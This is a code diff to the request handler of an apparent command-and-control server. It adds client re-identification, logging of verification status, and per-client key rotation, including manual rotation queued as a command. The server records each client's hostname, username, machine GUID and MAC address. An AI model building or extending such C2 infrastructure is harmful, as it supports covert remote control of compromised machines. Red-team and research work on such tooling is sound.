@@ -268,15 +268,28 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                             break
                 
                 # If we identified the client by identifier, use that ID, otherwise generate a new one
-                client_id = identified_client_id or self.client_manager.add_client(
-                    ip=ip,
-                    hostname=hostname,
-                    username=username,
-                    machine_guid=machine_guid,
-                    os_version=os_version,
-                    mac_address=mac_address,
-                    system_info=system_info
-                )
+                client_id = identified_client_id
+                if not client_id:
+                    client_id = self.client_manager.add_client(
+                        ip=ip,
+                        hostname=hostname,
+                        username=username,
+                        machine_guid=machine_guid,
+                        os_version=os_version,
+                        mac_address=mac_address,
+                        system_info=system_info
+                    )
+                else:
+                    # Update the existing client information
+                    self.client_manager.add_client(
+                        ip=ip,
+                        hostname=hostname,
+                        username=username,
+                        machine_guid=machine_guid,
+                        os_version=os_version,
+                        mac_address=mac_address,
+                        system_info=system_info
+                    )
                 
                 # Keep track of whether key rotation is needed
                 key_rotation_needed = False
@@ -287,13 +300,43 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                     verifier = self.server.client_verifier
                     is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
                     
+                    # Add logging for verification status
+                    self.logger(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
+                    
                     # Update client verification status
                     self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
+                    self.logger(f"Set verification status for {client_id}: {is_verified} with confidence {confidence}")
                     
-                    # Check if client needs key rotation (verified but no unique key yet)
-                    if is_verified and not self.client_manager.has_unique_key(client_id):
+                    # Debug log to see what's in the client info after setting verification
+                    client_updated = self.client_manager.get_clients_info().get(client_id, {})
+                    verification_status = client_updated.get("verification_status", {})
+                    self.logger(f"Updated client verification status: {verification_status}")
+                    
+                    # Check if client needs key rotation using the has_unique_key method if available
+                    has_unique_key = False
+                    if hasattr(self.client_manager, 'has_unique_key'):
+                        has_unique_key = self.client_manager.has_unique_key(client_id)
+                    else:
+                        # Fallback to direct check
+                        has_unique_key = hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
+                    
+                    # Only rotate key if verified and doesn't already have a key
+                    if is_verified and not has_unique_key:
                         key_rotation_needed = True
                         self.logger(f"Client {client_id} verified and eligible for key rotation")
+                    
+                    # Check for manual key rotation request 
+                    requested_key_rotation = False
+                    for cmd in self.client_manager.get_pending_commands(client_id):
+                        if cmd.get('command_type') == 'key_rotation':
+                            # Mark rotation as needed even if the client already has a key
+                            # This allows manual rotation of keys when requested
+                            requested_key_rotation = True
+                            self.logger(f"Manual key rotation requested for client {client_id}")
+                            break
+
+                    # Decide if key rotation is needed
+                    key_rotation_needed = (is_verified and (not has_unique_key or requested_key_rotation))
                     
                     if not is_verified:
                         warning_str = ", ".join(warnings)
@@ -303,6 +346,19 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
                     verifier.register_client(client_id, system_info)
                 
                 self.logger(f"Client identified as {client_id} ({hostname}/{username})")
+                
+                # Debug log to check key status
+                if hasattr(self.client_manager, 'client_keys'):
+                    has_key = client_id in self.client_manager.client_keys
+                    self.logger(f"Key status for {client_id}: has_unique_key={has_key}")
+                else:
+                    self.logger(f"Client manager does not have client_keys attribute")
+                    
+                # Also check if key_rotation_time is in client info
+                client_info = self.client_manager.get_clients_info().get(client_id, {})
+                if 'key_rotation_time' in client_info:
+                    self.logger(f"Client {client_id} has key_rotation_time: {client_info['key_rotation_time']}")
+                    
             except Exception as e:
                 self.logger(f"Error processing system information: {str(e)}")
                 # Fall back to IP-based identification
